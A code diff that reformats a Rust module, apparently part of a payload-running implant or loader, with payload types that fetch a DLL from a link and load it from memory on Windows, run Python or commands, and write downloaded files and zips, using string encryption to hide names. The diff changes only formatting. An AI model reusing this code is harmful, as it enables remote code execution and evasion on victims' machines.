@@ -22,8 +22,8 @@ use log::info;
 use std::io::stdout;
 use std::io::Write;
 
-use crate::link::{Link, LinkFetch};
 use crate::config::Config;
+use crate::link::{Link, LinkFetch};
 
 use cryptify::encrypt_string;
 
@@ -44,8 +44,7 @@ pub enum PayloadExec {
     Thread(thread::JoinHandle<()>, Payload),
 }
 
-#[derive(PartialEq)]
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
     DllFromMemory(DllFromMemory),
     ExecPython(ExecPython),
@@ -55,7 +54,7 @@ pub enum Payload {
     Exec(Exec),
 }
 impl Payload {
-    pub fn exec_payload(&self,config:&Config) -> PayloadExec {
+    pub fn exec_payload(&self, config: &Config) -> PayloadExec {
         let exec_result = match &self {
             Payload::Banner() => banner(),
             Payload::WriteFile(payload) => payload.write_file(config),
@@ -100,8 +99,7 @@ impl Payload {
     }
 }
 
-#[derive(PartialEq)]
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct DllFromMemory {
     pub link: Link,
     pub dll_entrypoint: String,
@@ -110,13 +108,13 @@ pub struct DllFromMemory {
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self,_config:&Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExec, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
         Ok(PayloadExec::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn dll_from_memory(&self, config: &Config) -> Result<PayloadExec, anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
@@ -167,8 +165,7 @@ impl DllFromMemory {
     }
 }
 
-#[derive(PartialEq)]
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct ExecPython {
     pub path: String, //path of python directory
     pub python_code: String,
@@ -243,15 +240,14 @@ pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     Ok(PayloadExec::NoThread())
 }
 
-#[derive(PartialEq)]
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct WriteZip {
     pub link: Link,
     pub path: String,
 }
 
 impl WriteZip {
-    pub fn write_zip(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_zip(&self, config: &Config) -> Result<PayloadExec, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
@@ -274,8 +270,7 @@ impl WriteZip {
     }
 }
 
-#[derive(PartialEq)]
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct WriteFile {
     pub link: Link,
     pub path: String,
@@ -283,7 +278,7 @@ pub struct WriteFile {
 }
 
 impl WriteFile {
-    pub fn write_file(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_file(&self, config: &Config) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
@@ -301,8 +296,7 @@ impl WriteFile {
     }
 }
 
-#[derive(PartialEq)]
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct Exec {
     pub path: String,
     pub cmdline: String,
